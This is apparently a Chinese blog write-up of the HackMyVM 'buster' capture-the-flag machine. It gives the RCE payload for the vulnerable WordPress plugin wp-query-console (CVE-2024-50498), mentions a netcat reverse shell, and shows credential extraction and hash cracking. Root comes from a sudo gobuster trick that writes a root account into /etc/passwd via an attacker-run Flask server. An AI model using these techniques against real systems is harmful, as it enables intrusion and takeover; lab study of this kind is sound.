---
title: HackMyVM-buster
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# buster.

> https://hackmyvm.eu/machines/machine.php?vm=buster
> 

Notes: **Wish you have fun.**

## 前期踩点

`nmap`扫描，`24`是靶机

```bash
┌──(root㉿kali)-[~]
└─# nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 05:47 EST
Nmap scan report for 192.168.56.1
Host is up (0.00050s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00035s latency).
MAC Address: 08:00:27:0F:6C:5D (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.24
Host is up (0.00051s latency).
MAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 28.10 seconds
```

```bash
┌──(root㉿kali)-[~]
└─# nmap -sT -min-rate 10000 -p- 192.168.56.24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 05:49 EST
Nmap scan report for 192.168.56.24
Host is up (0.00086s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)
```

可以看到是搭建了`WordPress6.7.1`

```bash
┌──(root㉿kali)-[~]                                                                                                                                          
└─# nmap -sT -A -T4 -O -p 22,80 192.168.56.24               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 05:50 EST
Nmap scan report for 192.168.56.24
Host is up (0.00054s latency).
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey:                    
|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)                
|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)             
80/tcp open  http    nginx 1.14.2
|_http-title: bammmmuwe                                                       
|_http-generator: WordPress 6.7.1      
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: nginx/1.14.2     
MAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)                
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        
Device type: general purpose                                                  
Running: Linux 4.X|5.X            
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5               
OS details: Linux 4.15 - 5.8                                                  
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                       
                                       
TRACEROUTE                                                                    
HOP RTT     ADDRESS                    
1   0.54 ms 192.168.56.24
```

```bash
┌──(root㉿kali)-[~]                                                           
└─# nmap -script=vuln -p 22,80 192.168.56.24
NSE Timing: About 99.51% done; ETC: 05:53 (0:00:01 remaining)      
Nmap scan report for 192.168.56.24
Host is up (0.00056s latency).                                                
                                                                              
PORT   STATE SERVICE                                                          
22/tcp open  ssh                 
80/tcp open  http      
|_http-csrf: Couldn't find any CSRF vulnerabilities.                          
|_http-dombased-xss: Couldn't find any DOM based XSS.                         
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.              
| http-enum:                      
|   /wp-login.php: Possible admin folder                      
|   /wp-json: Possible admin folder                                                                                                                          
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2                                        
|   /: WordPress version: 6.7.1                                               
|   /feed/: Wordpress version: 6.7.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.                 
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.               
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.            
|   /wp-login.php: Wordpress login page.                                      
|   /wp-admin/upgrade.php: Wordpress login page.                              
|   /readme.html: Interesting, a readme.                                      
|_  /0/: Potentially interesting folder                                                                                                                      
MAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)
```

访问主页，并查看指纹识别。和扫描的一样是`WordPres6.7.1`

![image.png](image%2077.png)

查看网站`robots.txt`文件

```bash
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http:/wp-sitemap.xml
```

## WPScan

因为是`WordPress`，所以可以使用`WPScan` 来扫描（指定你的`API token`来扫描漏洞）

```bash
┌──(root㉿kali)-[~]
└─# wpscan --url 192.168.56.24 --api-token xxxxx -e u,ap
```

扫了快`30`分钟，才扫描完成，扫出了一个存在漏洞的插件`wp-query-console`

```bash
[+] wp-query-console
 | Location: http://192.168.56.118/wp-content/plugins/wp-query-console/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2018-03-16T16:03:00.000Z
 | Readme: http://192.168.56.118/wp-content/plugins/wp-query-console/README.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.56.118/wp-content/plugins/wp-query-console/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP Query Console <= 1.0 - Unauthenticated Remote Code Execution
 |     References:
 |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.118/wp-content/plugins/wp-query-console/README.txt
```

## CVE-2024-50498

在`github`上找到：https://github.com/RandomRobbieBF/CVE-2024-50498 `POC` 链接

```bash
POST /wp-json/wqc/v1/query HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console
Content-Type: application/json
Content-Length: 45
Origin: http://kubernetes.docker.internal
Connection: keep-alive
Priority: u=0

{"queryArgs":"phpinfo();","queryType":"post"}
```

![image.png](image%2078.png)

但是打算执行系统命令时发现执行不了，`system`和`exec`都使用不了

![image.png](image%2079.png)

可能是一些函数被禁用了，搜索一下**`*disable_functions` ,***一看好家伙禁得还不少，但是`shell_exec`还没禁用

![image.png](image%2080.png)

但是执行命令没有回显

![image.png](image%2081.png)

`ping`是可以成功接收到的

```bash
┌──(root㉿kali)-[~]                                                                                                                                          
└─# tcpdump icmp -i eth1                                                                                                                                     
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode                                                                                    
listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes                                                                                 
07:45:12.562498 IP 192.168.56.24 > 192.168.56.4: ICMP echo request, id 1669, seq 63, length 64
```

尝试反弹`shell` ，因为闭合问题不能使用`/bin/bash`弹，使用`nc`也成功了

![image.png](image%2082.png)

```bash
┌──(root㉿kali)-[~]
└─# nc -lvp 4444
listening on [any] 4444 ...
192.168.56.24: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.24] 59298
```

## 靶机信息搜集

存在`python` ，先获得好点的`shell`

```bash
python -c "import pty;pty.spawn('/bin/sh')"
```

在`wp-config.php`里面发现数据库账号密码

```bash
/** Database username */                                                                                                                                     
define( 'DB_USER', 'll104567' );                                                                                                                             
                                                                                                                                                             
/** Database password */                                                      
define( 'DB_PASSWORD', 'thehandsomeguy' );
```

查询`wp_users`数据库

```bash
MariaDB [wordpress]> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url              | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | ta0        | $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. | ta0           | 2814928906@qq.com | http://192.168.31.181 | 2025-01-08 03:10:43 |                                               |           0 | ta0          |
|  2 | welcome    | $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ | welcome       | 127.0.0.1@qq.com  |                       | 2025-01-08 04:29:28 | 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. |           0 | welcome      |
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+

```

将密码保存为`pass`，如何使用`john`来破解，爆破出来了

```bash
┌──(root㉿kali)-[~/Desktop/test/buster]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt pass 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
104567           (?)     
```

尝试`ssh`登陆成功

```bash
┌──(root㉿kali)-[~]
└─# ssh welcome@192.168.56.24 -t bash
welcome@192.168.56.24's password: 
welcome@listen:~$ ls
user.txt
```

进去后可以在当前目录找到`UserFlag`

```bash
$ cat user.txt
29e0f786e8c90b3ce82e00de0ec7e7d3
```

## 提权

查看权限，可以以`root`身份执行`gobuster`

```bash
welcome@listen:/$ sudo -l
Matching Defaults entries for welcome on listen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on listen:
    (ALL) NOPASSWD: /usr/bin/gobuster

```

查看其权限

```bash
welcome@listen:/$ ls -al /usr/bin/gobuster
-rwxr-xr-x 1 root root 4953296 Jun 13  2023 /usr/bin/gobuster
```

到这里就不懂了（雾），看了`writeup`后发现可以利用`gobuster`中的结果输出到指定文件即可

先看参数解释

```bash
welcome@listen:/tmp$ gobuster -h                                                                                                                             
Usage of gobuster:
  -P string                                                                   
        Password for Basic Auth (dir mode only)
  -U string                                                                   
        Username for Basic Auth (dir mode only)
  -a string                     
        Set the User-Agent string (dir mode only)
  -c string
        Cookies to use for the requests (dir mode only)
  -cn      
        Show CNAME records (dns mode only, cannot be used with '-i' option)
  -e    Expanded mode, print full URLs
  -f    Append a forward-slash to each directory request (dir mode only)      
  -fw                                                                         
        Force continued operation when wildcard found
  -i    Show IP addresses (dns mode only)            
  -k    Skip SSL certificate verification                                     
  -l    Include the length of the body in the output (dir mode only)
  -m string          
        Directory/File mode (dir) or DNS mode (dns) (default "dir")           
  -n    Don't print status codes                                              
  -np                 
        Don't display progress                                                
  -o string                          
        Output file to write results to (defaults to stdout)
  -p string                                                                   
        Proxy to use for requests [http(s)://host:port] (dir mode only)       
  -q    Don't print the banner and other noise       
  -r    Follow redirects      
  -s string                                                                   
        Positive status codes (dir mode only) (default "200,204,301,302,307,403")                                                                            
  -t int          
        Number of concurrent threads (default 10)                             
  -to duration                                                                
        HTTP Timeout in seconds (dir mode only) (default 10s)                 
  -u string                                                                   
        The target URL or Domain
  -v    Verbose output (errors)                                               
  -w string
        Path to the wordlist                                                  
  -x string
        File extension(s) to search for (dir mode only)                                   
```

例如：我们先创建字典文件`wordlist` ，里面写入`hello` 。

```bash
welcome@listen:/tmp$ cat wordlist 
hello
```

在`kali`创建`hello`文件，并创建简易web服务器

```bash
┌──(root㉿kali)-[~/Desktop/test/buster]
└─# ls
hello

┌──(root㉿kali)-[~/Desktop/test/buster]
└─# php -S 0:81
```

通过`gobuster`扫描`kali` 将输出结果放入到`test`文件

这样就可以将文字输入带文字了，假如我们将其输入到`/etc/passwd`文件呢？

```bash
welcome@listen:/tmp$ gobuster -u http://192.168.56.4:81/ -w wordlist -n -q -o test
/hello
welcome@listen:/tmp$ cat test
/hello
```

我们打算计划向`/etc/passwd`写入`hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash` （长度为`40`） 但是因为会触发交换文件。

所以打算创建`web`服务器，将接收到路径长度`≠40`的数据包都返回`200` ，那么就会输出中写出来

(代码参照：https://7r1umph.github.io/post/hmv_buster.html#4.%E6%8F%90%E6%9D%83)

```bash
from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
# 接收所有路径
@app.route('/<path:path>')
# catch_all 处理所有请求
def catch_all(path):
		# 参数path是从url中提取的路径
    if len(path) == 1:
        return Response(status=404)
    else:
        return Response(status=200)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=81) 
```

启动服务器

```bash
┌──(root㉿kali)-[~/Desktop/test/buster]
└─# python3 a.py
 * Serving Flask app 'a'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:81
Press CTRL+C to quit
```

靶机在字典中写入`hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash` ，并使用`gobuster`将其写入`/etc/passwd`

```bash
welcome@listen:/tmp$ echo "hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash" > wordlist
welcome@listen:/tmp$ sudo /usr/bin/gobuster -w wordlist -u http://192.168.56.4:81/ -n -q -fw -o /etc/passwd                                                  
```

切换到到`/hack`用户，密码`123456`

```bash
/hack@listen:/tmp# id
uid=0(/hack) gid=0(root) groups=0(root)
```

读取`RootFlag`

```bash
/hack@listen:/root# cat R00t_fl4g_is_HHHHerererererrererere.txt 
b6a1a0de4223ba038327fc9c647701fb
```

## 总结

更加熟练对`wpscan`的使用，以及学到如何使用`gobuster`提权，如何使用`flask`搭建简易服务器